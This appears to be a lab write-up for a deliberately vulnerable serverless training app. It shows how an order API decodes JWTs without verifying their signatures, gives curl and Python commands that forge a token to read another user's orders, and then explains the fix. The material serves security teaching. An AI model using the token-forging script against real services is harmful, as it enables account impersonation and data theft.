# Lesson 2 · Broken Authentication

## Vulnerability Summary
The `/order` API endpoint uses JWTs for identity, but `DVSA-ORDER-MANAGER` **only decodes** the token payload — it never cryptographically **verifies** the signature. An attacker can forge a JWT by modifying the `username` and `sub` fields to impersonate any user.

## Root Cause
The Lambda splits the JWT into three parts, base64-decodes the payload, and reads `token.username` — without calling any signature verification function. Because the signature is never checked, a tampered token is trusted identically to a legitimate one.

## AWS Components
| Component | Role |
|-----------|------|
| Amazon API Gateway | Routes requests |
| AWS Lambda (DVSA-ORDER-MANAGER) | Vulnerable JWT handler |
| Amazon Cognito | Legitimate JWT issuer (JWKS not consulted) |
| Amazon DynamoDB | Stores orders per user |

## Tools Used
- Browser DevTools (Network tab)
- `curl`
- `python3`
- `jq`
- AWS Console

## Reproduction Steps

### Phase 1 — Create Two Accounts
Register **User B** (attacker) and **User C** (victim). Both must place at least one order.

### Phase 2 — Capture Attacker Token
Log in as User B. Open DevTools → Network → filter XHR. Click **Orders**. Copy the `Authorization: Bearer <token>` value.

```bash
export API="https://<API-ID>.execute-api.us-east-1.amazonaws.com/Stage/order"
export TOKEN_B="<attacker_token>"
```

### Phase 3 — Confirm Normal Behavior
```bash
curl -s $API \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data '{"action":"orders"}' | jq
```
Only User B's orders are returned.

### Phase 4 — Decode the Attacker Token
```bash
python3 - <<'PY'
import os, json, base64
t = os.environ["TOKEN_B"]
h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p))
print(json.dumps(data, indent=2))
PY
```
Note the `username` and `sub` fields.

### Phase 5 — Capture Victim's Username
Log in as User C, repeat DevTools steps, copy their username.
```bash
export VICTIM_USER="username_of_user_c"
```

### Phase 6 — Forge the Token
```bash
export FAKE_AS_C="$(python3 - <<'PY'
import os, json, base64
t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]
h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p))
data["username"] = victim
data["sub"] = victim
newp = base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()
print(f"{h}.{newp}.{s}")
PY
)"
```

### Phase 7 — Use the Forged Token
```bash
curl -s $API \
  -H "content-type: application/json" \
  -H "authorization: $FAKE_AS_C" \
  --data '{"action":"orders"}' | jq
```
**Result:** Victim's orders are returned — authentication bypassed.

## Evidence
The forged JWT (original signature, tampered payload) returns the victim's order list with status `"ok"`.

## Fix Summary
- Fetch Cognito public keys from the JWKS endpoint
- Verify the signature using `jose.JWS.createVerify().verify()`
- Only extract `username` **after** successful verification
- Return `401 Unauthorized` if verification fails

See [`/Codefix/Lesson02-Broken-Authentication/`](../../Codefix/Lesson02-Broken-Authentication/) for the patched code.

## Lessons Learned
JWTs must be **cryptographically verified**, not merely decoded. A decoded-but-unverified token gives attackers full control over identity claims.
